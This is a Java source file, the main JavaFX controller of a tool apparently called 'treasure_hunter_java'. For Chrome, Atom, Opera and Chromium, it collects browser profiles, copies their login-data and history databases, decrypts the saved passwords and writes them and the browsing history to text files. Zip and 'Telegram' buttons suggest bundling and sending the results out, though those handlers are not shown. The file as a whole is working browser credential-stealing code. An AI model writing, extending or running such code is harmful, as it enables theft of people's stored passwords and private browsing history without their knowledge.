package com.treasure_hunter_java.controllers;

import com.treasure_hunter_java.Main;
import com.treasure_hunter_java.decrypt.CopyFiles;
import com.treasure_hunter_java.decrypt.Decrypt;
import com.treasure_hunter_java.browsers.*;
import javafx.fxml.FXML;
import javafx.fxml.FXMLLoader;
import javafx.fxml.Initializable;
import javafx.scene.Parent;
import javafx.scene.Scene;
import javafx.scene.control.*;
import javafx.scene.image.Image;
import javafx.stage.DirectoryChooser;
import javafx.stage.Stage;
import jfxtras.styles.jmetro.JMetro;
import jfxtras.styles.jmetro.Style;

import java.io.BufferedWriter;
import java.io.File;
import java.io.FileWriter;
import java.io.IOException;

public class MainController extends Controller {

    @FXML
    private Button searchPasswordsButton;

    @FXML
    private CheckBox passwordsGoogle;

    @FXML
    private CheckBox historyGoogle;

    @FXML
    private CheckBox passwordsAtom;

    @FXML
    private CheckBox historyAtom;

    @FXML
    private CheckBox passwordsOpera;

    @FXML
    private CheckBox historyOpera;

    @FXML
    private CheckBox passwordsChromium;

    @FXML
    private CheckBox historyChromium;

    @FXML
    private Button generateDictionaryButton;

    @FXML
    private Button reportButton;

    @FXML
    private Button zipButton;

    @FXML
    private Button telegramButton;

    @FXML
    private Button selectDirectoryButton;

    @FXML
    private Button start;

    private void writeData(String text, String dataName, String browserDirectory) throws IOException {

        File file = new File(Main.mainWorkDirectory + browserDirectory + dataName);

        try (FileWriter fw = new FileWriter(file);
             BufferedWriter bw = new BufferedWriter(fw))
        {
            bw.write(text);
        }

    }
    private void getGoogleData(CopyFiles copyFiles) throws Exception {

        Chrome chrome = new Chrome();
        chrome.collectProfiles();
        String browserName = "/chrome_data/";

        if (passwordsGoogle.isSelected()){
            copyFiles.copyLoginData(chrome.getProfiles(), chrome.getLocalState(), browserName);
            writeData(Decrypt.decryptPasswords(Main.mainWorkDirectory + browserName),
                    "passwords.txt", browserName);
        }

        if (historyGoogle.isSelected()){
            copyFiles.copyHistory(chrome.getProfiles(), chrome.getLocalState(), browserName);
            writeData(Decrypt.getHistory(Main.mainWorkDirectory.toString() + browserName + "History"),
                    "history.txt", browserName);
        }
    }

    private void getAtomData(CopyFiles copyFiles) throws Exception {

        Atom atom = new Atom();
        atom.collectProfiles();
        String browserName = "/atom_data/";

        if (passwordsAtom.isSelected()) {
            copyFiles.copyLoginData(atom.getProfiles(), atom.getLocalState(), browserName);
            writeData(Decrypt.decryptPasswords(Main.mainWorkDirectory + browserName),
                    "passwords.txt", browserName);
        }

        if (historyAtom.isSelected()){
            copyFiles.copyHistory(atom.getProfiles(), atom.getLocalState(), browserName);
            writeData(Decrypt.getHistory(Main.mainWorkDirectory.toString() + browserName + "History"),
                    "history.txt", browserName);
        }
    }

    private void getOperaData(CopyFiles copyFiles) throws Exception {

        Opera opera = new Opera();
        opera.collectProfiles();
        String browserName = "/opera_data/";

        if (passwordsOpera.isSelected()) {
            copyFiles.copyLoginData(opera.getProfiles(), opera.getLocalState(), browserName);
            writeData(Decrypt.decryptPasswords(Main.mainWorkDirectory + browserName),
                    "passwords.txt", browserName);
        }

        if (historyOpera.isSelected()) {
            copyFiles.copyHistory(opera.getProfiles(), opera.getLocalState(), browserName);
            writeData(Decrypt.getHistory(Main.mainWorkDirectory.toString() + browserName + "History"),
                    "history.txt", browserName);
        }
    }

    private void getChromiumData(CopyFiles copyFiles) throws Exception {

        Chromium chromium = new Chromium();
        chromium.collectProfiles();
        String browserName = "/chromium_data/";

        if (passwordsChromium.isSelected()) {
            copyFiles.copyLoginData(chromium.getProfiles(), chromium.getLocalState(), browserName);
            writeData(Decrypt.decryptPasswords(Main.mainWorkDirectory + browserName),
                    "passwords.txt", browserName);
        }

        if (historyChromium.isSelected()) {
            copyFiles.copyHistory(chromium.getProfiles(), chromium.getLocalState(), browserName);
            writeData(Decrypt.getHistory(Main.mainWorkDirectory.toString() + browserName + "History"),
                    "history.txt", browserName);
        }
    }

    @FXML
    protected void onSearchPasswordsButtonClick() throws IOException {
        super.onSearchPasswordsButtonClick();
    }

    @FXML
    protected void GenerateDictionaryButtonClick() throws IOException {
        super.onGenerateDictionaryButtonClick();
    }

    @FXML
    protected void onReportButtonClick() throws Exception {
        super.onReportButtonClick();
    }

    @FXML
    protected void onZipButtonClick() throws IOException {
        super.onZipButtonClick();
    }

    @FXML
    protected void onTelegramButtonClick() throws IOException {
        super.onTelegramButtonClick();
    }

    @FXML
    protected void onSelectDirectoryButtonClick() {
        super.onSelectDirectoryButtonClick();
    }

    @FXML
    protected void onStartButtonClick() throws Exception {

        getGoogleData(new CopyFiles());
        getAtomData(new CopyFiles());
        getOperaData(new CopyFiles());
        getChromiumData(new CopyFiles());
    }
}